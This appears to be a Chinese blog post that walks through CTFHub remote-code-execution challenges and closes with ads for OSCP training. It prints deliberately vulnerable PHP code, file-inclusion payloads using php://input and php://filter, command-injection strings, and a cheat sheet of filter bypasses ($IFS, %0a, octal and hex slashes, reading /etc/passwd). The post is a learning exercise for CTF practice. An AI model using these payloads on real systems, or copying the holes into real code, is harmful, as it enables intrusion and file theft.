#  CTFHub-RCE题目wp   
原创 track  泷羽Sec-track   2025-02-09 17:47  
  
## 引言  
  
题目共有如下类型  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYwcuYwuH9akLdQs6aF9SaMx5ZqCibjjiaFj9eevL1mTn80uDUhb4yfYaw/640?wx_fmt=png&from=appmsg "")  
### 什么是RCE漏洞  
  
RCE漏洞，全称是**Remote Code Execution**  
漏洞，翻译成中文就是**远程代码执行**  
漏洞。顾名思义，这是一种安全漏洞，允许攻击者在受害者的系统上远程执行任意代码  
## eval执行  
  
分析源码：  
```
 <?php
if (isset($_REQUEST['cmd'])) {         //检查是否有cmd参数且不为空
    eval($_REQUEST["cmd"]);            //执行cmd传入的php代码
} else {
    highlight_file(__FILE__);
}
?> 

```  
  
执行命令查看当前目录  
```
?cmd=system("ls");

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYe4OlT3gYbkSwIKtrLcnJb5QiceBa6csRPDcRb4MwfqEsO78cGvlnJ9w/640?wx_fmt=png&from=appmsg "")  
  
查看根目录或者上级目录一个一个查找  
```
?cmd=system("ls /");
?cmd=system("ls ../../../");

```  
  
发现flag文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY2WUEta1cA7n0MRyNDHB0YuBibqicOssv3wYYgz3Oxh6bibuM8IHpZf7Kw/640?wx_fmt=png&from=appmsg "")  
  
**cat /flag_8751**  
即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYibQO36wySmJdDazyUSBSbiaibMib0VjialibD7hic0ztIibzJhRSCKW3BA8Xzw/640?wx_fmt=png&from=appmsg "")  
## 文件包含  
### 文件包含  
  
源码审计  
```
<?php
error_reporting(0);
if (isset($_GET['file'])) {                          //检查是否存在file参数且不为空
    if (!strpos($_GET["file"], "flag")) {            //过滤flag字符串
        include $_GET["file"];                       
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
  
<hr>
i have a <a href="shell.txt">shell</a>, how to use it ?   //提示有个shell.txt文件，内容为 <?php eval($_REQUEST['ctfhub']);?>

```  
  
利用文件包含读取**shell.txt**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY2oDNocm0vTbKThOODmwmCeia6q48l9ia3pZOusBgkTEjGR1RIzhWsTbw/640?wx_fmt=png&from=appmsg "")  
  
先了解一下**  
函数，是中一个非常方便的超级全局变量，它处理来自用户输入的数据。具体来说，  
_REQUEST` 变量包含了通过 **GET**  
、**POST**  
 和 **COOKIE**  
 方法传递的数据 ，所以可以利用**POST或cookie**  
传入**ctfhub**  
变量  
  
查看**根目录**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYmHHqicyMAStVgkgNYTon0VqzCkdYtx2lUmApTZrYzAnbRiaFqxFhibRBQ/640?wx_fmt=png&from=appmsg "")  
  
查找**flag**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYAOf6ojB7fFtP5lAZibkb6K386xV0e3icNZgJicHZ85RMrZPmx4LeN998w/640?wx_fmt=png&from=appmsg "")  
### php://input  
  
源码分析  
```
<?php
if (isset($_GET['file'])) {                                //检查是否存在file参数
    if ( substr($_GET["file"], 0, 6) === "php://" ) {      //检查参数前6位是否为 php:// ，是则执行
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
// 给了应该phpinfo.php超链接

```  
  
查看**phpinfo.php**  
文件，发现此处  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY1wgxjxzeRbpIuUDY4otFZG1GuI51X6ILZWFiamB0evm1Rhc7nFTYguA/640?wx_fmt=png&from=appmsg "")  
  
抓包**构造命令执行**  
，因为有**php://input**  
，故会执行传入的**php代码**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYf5NQqDJO10VLPnUBecPYiaUqviagic1NLdwHmbBiaP63yG7PibCianypA5rA/640?wx_fmt=png&from=appmsg "")  
  
查看**flag**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYO1ic4ZAiac4PWx6DA7hQlYY3MITGJFiaRKy2dTnzS7KwM8ibtuOJtYDdMw/640?wx_fmt=png&from=appmsg "")  
  
这里也可以利用**php伪协议**  
，会得到一串**base64加密的flag**  
，解密即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYkxLYq4ZlqBHPFg1oqicspZPIq2eswl8jibYBFYygT3CY6NZUrUbUKxjA/640?wx_fmt=png&from=appmsg "")  
  
或者：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYzVyXDvNGcichChUerwru2G2hD0rE9HawtbBCMYVuMEXCFJf0icXiaNXYg/640?wx_fmt=png&from=appmsg "")  
### 读取源代码  
  
源码审计  
```
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {    //检查file参数是否以 php:// 开头
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);                            //代码高亮，显示源码
}
?>

i don't have shell, how to get flag? flag in <code>/flag</code>                             //flag在根目录
```  
  
**php伪协议**  
读取flag  
```
?file=php://filter/read=/resource=/flag

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYZic6IlsIwWaLarICicEVm5IiaWJfibAET7iacYo1ZibLicgKC5L9c6VxTy5lQ/640?wx_fmt=png&from=appmsg "")  
### 远程包含  
  
源码审计  
```
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {      //过滤flag字符串
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>

```  
  
给了一个**phpinfo()界面，根据题目提示，还是文件包含题，抓包利用php;//input**  
读取  
  
查看**根目录**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYcZstezhgVG7Ac3TLMiaficXzribg7mjibPU27IIwNXwOqVxm7xtUczdfNg/640?wx_fmt=png&from=appmsg "")  
  
读取**flag**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYFLiacibkEgjqTLl9xIGOooO5d6kQicxYLI0mP0S8bztomywkVZNSyztpw/640?wx_fmt=png&from=appmsg "")  
## 命令注入  
- 这里需要了解一下常见的命令分隔符  
  
- **; :**  
 无论前面是否执行，后面都执行  
  
- **||（逻辑或）：**  
前命令失败执行后命令，如果前命令成功则不执行后命令  
  
- **| ：**  
前者结果作为后者参数使用  
  
- **&& ：**  
前命令成功执行后命令，如果失败则不执行后命令  
  
- **\n：**  
换行符，url编码%0a  
  
- **%0a**  
  （换行）  
  
- **%0d**  
  （回车）  
  
### 无过滤  
  
没有做任何过滤  
  
先**ping**  
一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYnrjSYRXq6oiatib6hBXvYUan0bjUPpltOfXBQ8zI4ic8tJMNB89CeTlGw/640?wx_fmt=png&from=appmsg "")  
  
查看**该目录**  
，使用 **127.0.0.1; ls**  
 也是可以的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYANR1icpg34kyIX0TZCznRmuwGxpj3ODFicuy6gvuibPicebbYIKQKqqYdQ/640?wx_fmt=png&from=appmsg "")  
  
查看**26398804916519.php**  
```
127.0.0.1 | cat 26398804916519.php

```  
  
发现**flag**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYiaVowyn5mh2xNdHXbAqHzTQJ8Vo1HdUqnibQlYxSTPGJl9nE9ibE0Ux4w/640?wx_fmt=png&from=appmsg "")  
### 过滤cat  
  
查看源码：  
```
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {   
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {           //过滤了cat字符串
        $cmd = "ping -c 4 {$ip}";                //windows默认ping4次，Linux不设置次数会一直ping
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}

```  
  
查看当前目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYmnONlxg4jmKQNu8lzwicn5hibV4IibRlH0dERZzAPia4JdaQIib0FCNhAEg/640?wx_fmt=png&from=appmsg "")  
  
因为cat被过滤了，此系统是linux操作系统，所以可以使用cat命令的平替，如 **nl     tac     c\at     less   more  tail**  
  等  
  
**nl**  
查看，得到**flag**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYICmgAojywVouN0QpLMQ6HUjNMrky5TeWBLCV3CW52DRj0CA6UYKNjA/640?wx_fmt=png&from=appmsg "")  
  
或者使用转义符 \ 绕过 也可以得到flag，会将c\at 分为**两个字符串**  
，则绕过cat过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY0Ggs29FE5QwaeX38UWr93iaK9fQ8JXNqJNmODpgOYj8hsxfBha3WuLg/640?wx_fmt=png&from=appmsg "")  
### 过滤空格  
  
查看源码  
```
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {                 //只过滤了空格
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

```  
  
先查看当前目录，得到flag文件  flag_11971489425983.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY8Ve2mLnBTEZ6t8qQicscO430dHSr5BOfrnCh7FWyBCzktBXr7S0icPsQ/640?wx_fmt=png&from=appmsg "")  
  
这里介绍几个绕过空格的方法  
```
$IFS$9   %09    <>    <     {cat,flag}

```  
  
可以绕过空格  
```
127.0.0.1;cat$IFS$9flag_11971489425983.php

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYJNPUYnBZDJYEqhpIgFRibCavhCNqR7OVUljFiaicehUOSWtDGmI4EQkpQ/640?wx_fmt=png&from=appmsg "")  
### 过滤目录分隔符  
  
几种常见的 / 符号绕过方法  
```
改变工作目录：cd xxx   避免使用 / 符号
环境变量截取： ${PATH:0:1}   ${HOME:0:1}
编码绕过：8进制： $(printf "\57")    16进制： $'\x2f'      $'\57'
调用命令生成：a=$(printf "/"); cat ${a}etc${a}passwd     cat  `echo /`etc`echo /`passwd
通配符替代(部分路径已知)：/???/cat /???/passwd            //匹配 /bin/cat
利用反斜杠：cat \/etc\/passwd
协议替代：file_get_contents('glob:///*'); 

```  
  
提示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYAdtyhfOJzd2piadcXzGB1PoGguUKeCGZ2hG5E0nHzbPUdvjaNdAgGkg/640?wx_fmt=png&from=appmsg "")  
  
源码  
```
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {         //过滤了 / 符号
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

```  
  
查看当前目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYibYnvv1ut8ibFZvcKspt1Z8WSmGOYxx2EGqzYJtWDQDyNhSwK02aO9pQ/640?wx_fmt=png&from=appmsg "")  
  
进入该目录并查看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY3xeux0iaWjUmRupWX9QLKhkpYz5jxSA8aI5ianXUcK8I7JTJiaZZRHcUw/640?wx_fmt=png&from=appmsg "")  
  
执行以下命令读取flag文件  
```
127.0.0.1;cd flag_is_here;cat flag_29914267619184.php

```  
  
得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYqgKkLhVLib6gmxfvCf9SU2ePInsweRSwXfRNAeY2txPr1AXHIT7xUFA/640?wx_fmt=png&from=appmsg "")  
### 过滤运算符  
  
查看源码，可以利用 **；**  
绕过  
```
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||\&)/", $ip, $m)) {          //利用正则匹配过滤了 | 和 & 
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

```  
  
查看当前目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYC91vkcXwtNCsBLNm9YQoQO7uzcRFK3Xc4IgGFQclIPPIibQojdUvDicw/640?wx_fmt=png&from=appmsg "")  
  
执行以下命令  
```
127.0.0.1;cat flag_4351260182213.php

```  
  
得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYliatGsMlG7bC4cUM3YIuiam2bYYLtVicbhKQic74k10WYSun25jicoOjYicw/640?wx_fmt=png&from=appmsg "")  
### 综合过滤练习  
  
源码审计  
```
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {  //过滤了 | & ; 空格 / cat flag ctfhub
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

```  
  
利用换行符**%0a绕过**查看当前目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYsQLZw4ZKvNmXxib7iavTkkhZ5KZuwLgtI2G7sLr0gd0oMmZ3ZibCr5oIQ/640?wx_fmt=png&from=appmsg "")  
  
查看根目录，没有有用信息，flag应该存在**flag_is_here**  
目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYdRlA70s1sc6X2pljSpXMjicQf8AD4GKB3zDqBfkXogBsYG0FBiaKnibNw/640?wx_fmt=png&from=appmsg "")  
  
执行以下命令  
```
?ip=127.0.0.1%0acd$IFS$9f\lag_is_here%0als         //flag被过滤，需要绕过

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYsXAcHYBxibaI0yIcz4QldhyZzuDDJSCpIa4uCSr7xlRGg7vznNrgPLg/640?wx_fmt=png&from=appmsg "")  
  
查看该flag  
```
?ip=127.0.0.1%0acd$IFS$9f\lag_is_here%0anl$IFS$9f\lag_172132798218075.php  //绕过cat

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYyjAVLrQdoCAxyMIXqkh2m5sR4fJl4s6jB1LQuo2jwI5WWiauUbBibcicg/640?wx_fmt=png&from=appmsg "")  
# end  
## oscp  
  
有对红队工作感兴趣，或者有意报考oscp的师傅，可以考虑一下我们的培训课程，加我微信咨询，好处如下：  
  
**1.报考后课程随时可看，并且如果对考试没有信心，还可以留群跟第二批课程学习，不限次数时间，报考即是一辈子可看**  
  
**2.200+台靶机及官方课程，lab靶机+域的内容团队泷老师和小羽老师会带大家全部过一遍，并且群内随时答疑，团队老师及群友都会积极解答，全天可答疑**  
  
**3.目前可接受分期付款，无利息，最多分四个月，第一次付完即可观看视频**  
  
**4.加入课程可享受工作推荐机会，优秀者可内推至红队，月薪3w+**  
  
**5.报考即送送官方文档中文版，以及kali命令详解中文版，纯人工翻译，版权为团队所有**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYuy8yNlMhNw3PdML0iaWSk1JfUibia75Wiaxrrf4ZoRlxYO21ckPC8alkzw/640?wx_fmt=png&from=appmsg "")  
  
**资料：**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYPCTyuLEmmN90icyg9vAKv75eWJrmiaG0XaGWeenSmqMricZmSomeSRSMg/640?wx_fmt=png&from=appmsg "")  
## 知识星球  
  
**还可以加入我们的知识星球，包含cs二开，甲壳虫，网恋避险工具，红盟工具等，还有很多src挖掘资料包**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYnqiaw7vz5Picm1eEv0EH8lBYS9iciaP1Kh9QJ0AZyT2lgT91WeRWx64kYg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkYNvS5ZibT0ArWI6qVfhCbxz174Cw1Mm8j0oRJ1jxq8u93LDY9YaItt0g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY6TrORzGUiawaNtJUazQb2YyNUneM0lMKhV3C4wFXbIQhtFhbGp8ksbg/640?wx_fmt=jpeg&from=appmsg "")  
## 学习交流群  
  
在**公众号后台**  
这里选择**学习交流**  
即可，如果图片二维码过期，可以加我微信获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw1oX6Qq34T6JmDHYym3AlkY9c1zGic2sgZqISCRLETDG4ZJB6PNWQzT3eZ2vLWiaQpQP0lKDSTwBaAg/640?wx_fmt=png&from=appmsg "")  
  
  
  
